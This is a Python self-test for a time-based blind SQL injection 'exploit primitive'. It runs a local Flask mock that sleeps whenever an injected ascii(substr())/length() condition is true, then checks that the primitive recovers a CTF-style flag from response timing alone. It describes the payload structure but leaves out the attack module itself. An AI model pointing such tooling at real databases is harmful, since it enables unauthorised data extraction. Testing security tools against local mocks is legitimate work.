"""Live self-check for the time_blind exploit primitive (primitives/time_blind.run).

Stands up a minimal Flask target on 5092 whose /api endpoint understands the exact
time-delay injection the primitive sends: it parses the injected boolean (an ascii/substr
char probe or a length probe against a known FLAG) and time.sleep()s the payload's delay
ONLY when that boolean is true. The primitive must recover the flag purely from response
latency — there is no content marker in the body. Small delay (0.3s) so the run is fast.

Local socket only (no docker). Run: ./.venv/bin/python verify_time_blind.py
"""
import re, sys, time, threading, subprocess, logging
from pathlib import Path
from flask import Flask, request

sys.path.insert(0, str(Path(__file__).parent))
from primitives import time_blind

PORT = 5092
FLAG = "flag{t1m3_bl1nd}"

app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)   # quiet the per-request log

_CHAR = re.compile(r"ascii\(substr\(.*?,(\d+),1\)\)>(\d+)")   # ascii(substr(SUB,pos,1))>val
_LEN  = re.compile(r"length\(.*?\)>(\d+)")                    # length(SUB)>val
_SLP  = re.compile(r"sleep\(([\d.]+)\)")                      # payload's delay seconds


def _truth(q: str) -> bool:
    """Evaluate the boolean the primitive injected against FLAG. We control both sides."""
    m = _CHAR.search(q)
    if m:
        pos, val = int(m.group(1)), int(m.group(2))
        c = ord(FLAG[pos - 1]) if 1 <= pos <= len(FLAG) else 0   # 1-indexed like SQL substr
        return c > val
    m = _LEN.search(q)
    if m:
        return len(FLAG) > int(m.group(1))
    return False


@app.route("/api")
def api():
    q = request.args.get("q", "")
    if _truth(q):
        m = _SLP.search(q)
        time.sleep(float(m.group(1)) if m else 0.0)   # SLOW response == condition TRUE
    return "ok"                                        # body identical either way (no oracle)


if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(port=PORT, threaded=True), daemon=True).start()
    time.sleep(1.2)

    class HostSB:
        """Run the primitive's script on the host (needs only python3 + base64 + urllib)."""
        def bash(self, cmd: str) -> str:
            return subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True,
                                  timeout=180).stdout

    sb = HostSB()
    out = time_blind.run(sb, {
        "oracle_url": f"http://127.0.0.1:{PORT}/api?q=1{{cond}}",
        "delay_s": 0.3, "threshold_s": 0.18, "reps": 1,
        "encode_depth": 1,          # percent-encode the payload once so spaces/parens are URL-safe
    })
    print(out.strip())
    assert "TIME_BLIND_OK" in out, "primitive did not complete"
    assert f"RECOVERED: {FLAG}" in out, f"wrong extraction: {out!r}"
    print(f"  ok  recovered the flag from RESPONSE TIMING alone (no content marker)")

    # calibration failure: threshold above the delay -> a true condition never looks slow
    bad = time_blind.run(sb, {
        "oracle_url": f"http://127.0.0.1:{PORT}/api?q=1{{cond}}",
        "delay_s": 0.3, "threshold_s": 5.0, "encode_depth": 1})
    assert "TIME_BLIND_FAIL" in bad, "should report calibration failure when threshold unreachable"
    print("  ok  clear diagnostic when the timing oracle can't be calibrated")

    # arg guards
    assert "must contain the literal token {cond}" in time_blind.run(sb, {"oracle_url": "http://h/x"})
    assert "{cond} and {sleep}" in time_blind.run(sb,
        {"oracle_url": "http://h/{cond}", "inject_template": "and {cond}"})
    assert "{d} token" in time_blind.run(sb,
        {"oracle_url": "http://h/{cond}", "sleep_expr": "sleep(2)"})
    print("  ok  arg validation")
    print("\ntime_blind verified: one call, recovers the flag through a pure timing oracle")
